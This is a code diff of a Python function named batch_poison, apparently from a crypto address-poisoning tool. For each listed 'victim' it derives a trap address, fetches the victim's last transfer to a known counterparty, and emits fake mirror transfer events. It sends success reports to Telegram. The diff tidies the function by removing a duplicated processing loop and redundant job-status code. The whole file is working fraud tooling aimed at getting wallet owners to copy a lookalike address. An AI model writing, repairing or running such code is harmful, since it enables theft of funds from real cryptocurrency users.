@@ -824,42 +824,7 @@ def batch_poison(job_id=None, campaign_id=None):
         update_job(job_id, total=total)
 
     success = 0
-    for i, (victim, key) in enumerate(entries, 1):
-        if victim.lower() in caught:
-            logger.info(f"Skipping caught victim {victim}")
-            continue
-
-        logger.info(f"[{i}/{total}] Processing victim {victim}")
-        
-        trap_address = w3.eth.account.from_key(key).address.lower()
-        
-        # Fetch counterparty from DB
-        counterparty = get_counterparty_from_db(victim, campaign_id)
-        if not counterparty:
-            logger.warning(f"[{i}/{total}] No counterparty found for {victim}, skipping")
-            continue
-        
-        # Fetch last transfer from blockchain
-        logger.info(f"[mirror] Fetching last transfer from {victim} to {counterparty}...")
-        fetched_asset, fetched_amount = fetch_last_transfer_from_blockchain(victim, counterparty)
-        
-        if not fetched_asset or not fetched_amount:
-            logger.warning(f"[{i}/{total}] No transfer found for {victim}, skipping")
-            continue
-        
-        logger.info(f"[mirror] Last transfer: {fetched_amount} units of {fetched_asset}")
-        
-        
-        # Emit FAKE mirror event (no real tokens needed)
-        tx_hash = emit_mirror_transfer(victim, trap_address, fetched_amount, fetched_asset, campaign_id)
-        
-    total = len(entries)
-    logger.info(f"Found {total} victims. Processing with mirror events only...")
-    if job_id:
-        update_job(job_id, total=total)
-
-    success = 0
-    gas_failures = 0  # Track insufficient gas failures
+    gas_failures = 0
     
     for i, (victim, key) in enumerate(entries, 1):
         if victim.lower() in caught:
@@ -911,7 +876,7 @@ def batch_poison(job_id=None, campaign_id=None):
             )
             send_telegram(success_msg, campaign_id=campaign_id)
         else:
-            # Check if this was a gas failure (emit_mirror_transfer returns None for gas issues too)
+            # Check if this was a gas failure
             operator_key = get_mirror_operator_key(campaign_id)
             if operator_key:
                 try:
@@ -959,19 +924,6 @@ def batch_poison(job_id=None, campaign_id=None):
             update_job(job_id, status='completed', progress=total, message='All done')
         else:
             update_job(job_id, status='failed', progress=success, message=f'{success}/{total} succeeded ({gas_failures} gas failures)')
-            
-        if job_id and i % 5 == 0:
-            update_job(job_id, progress=i)
-        time.sleep(1)
-
-    logger.info(f"Completed: {success}/{total} successful.")
-    send_telegram(f"🏁 Mirror batch complete: {success}/{total} successful.", campaign_id=campaign_id)
-
-    if job_id:
-        if success == total:
-            update_job(job_id, status='completed', progress=total, message='All done')
-        else:
-            update_job(job_id, status='failed', progress=success, message=f'{success}/{total} succeeded')
 
 if __name__ == "__main__":
     setup_graceful_shutdown()
